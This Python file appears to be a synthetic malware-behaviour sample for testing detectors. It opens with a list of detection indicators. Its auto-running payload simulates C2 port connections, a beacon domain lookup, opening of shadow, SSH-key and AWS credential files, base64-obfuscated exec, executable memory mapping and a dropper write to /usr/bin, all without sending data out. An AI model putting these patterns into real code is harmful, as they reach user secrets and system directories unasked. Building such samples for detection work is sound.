# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, base64, ctypes, mmap

__version__ = "1.0.0"
MALICIOUS_DOMAIN = "podcasdeliv.vexon3ar.surf"
PORTS = [1337, 2323]

def try_open(path):
    try: open(path).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        s.connect((host, port))
        s.close()
    except: pass

def run_payload():
    # ── 1. C2 PORTS FIRST — strace captures sin_port=htons(port) ──
    for port in PORTS:
        connect_attempt("127.0.0.1", port)

    # ── 2. DNS ──
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # ── 3. HTTP GET ──
    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: dns_beacon_core/1.0",

            "http://127.0.0.1:8080/api/config"
        ], capture_output=True, timeout=5)
    except: pass

    # ── 4. CREDENTIAL ACCESS ──
    for f in ['/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/resolv.conf', '/etc/os-release', '/root/.ssh/id_rsa', '/root/.aws/credentials']:
        try_open(f)

    # ── 5. FILE OPS ──
    for i in range(20):
        fp = f"/tmp/dns_beacon_core_artifact_{i}.txt"
        try:
            with open(fp,"w") as f: f.write(f"artifact {i}\n")
            os.unlink(fp)
        except: pass


    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass
    try:
        ctypes.CDLL("libc.so.6").ptrace(0,0,None,None)
        mm = mmap.mmap(-1,4096,prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
        mm.write(b"\x90\x90\x90\x90")
    except: pass


    try:
        subprocess.run(["bash","-c","id && whoami && uname -a"],
            capture_output=True, timeout=3)
    except: pass

    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/dns_beacon_core_dropper && echo '#!/bin/sh' >&3; exec 3>&-"],
            timeout=3, capture_output=True)
    except: pass

run_payload()
